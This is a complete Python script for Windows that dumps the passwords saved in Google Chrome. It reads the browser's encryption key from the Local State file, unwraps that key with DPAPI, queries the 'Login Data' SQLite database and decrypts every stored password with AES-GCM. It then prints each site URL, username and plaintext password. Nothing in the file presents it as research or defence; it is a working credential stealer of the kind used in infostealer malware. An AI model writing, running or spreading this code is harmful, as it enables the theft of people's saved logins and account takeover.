import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES

# Fetch the encryption key from Chrome's local state
def get_master_key():
    # Construct the path to the Local State file
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")
    
    # Read the Local State file and extract the encryption key
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
    
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
    # Remove the DPAPI stratum
    encryption_key = encryption_key[5:]
    # Use Windows DPAPI to decrypt the key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

# Decrypt passwords stored in Chrome's database
def password_decryption(password, encryption_key):
    try:
        # Extract initialization vector and encrypted password
        iv = password[3:15]
        password = password[15:]
        # Decrypt the password
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            # Fallback decryption using DPAPI
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # Return a placeholder if decryption fails
            return "No Passwords"

def main():
    key = get_master_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
    
    db = sqlite3.connect(db_path)
    cursor = db.cursor()

    cursor.execute(
        "select origin_url, action_url, username_value, password_value from logins")

    for row in cursor.fetchall():
        main_url, login_page_url, user_name, decrypted_password = row
        decrypted_password = password_decryption(row[3], key)
        
        # Write the extracted details to the output file
        if user_name or decrypted_password:
            print(f"URL: {main_url}\nLogin URL: {login_page_url}\nUser: {user_name}\nPassword: {decrypted_password}")

    # Clean up
    cursor.close()
    db.close()

if __name__ == "__main__":
    main()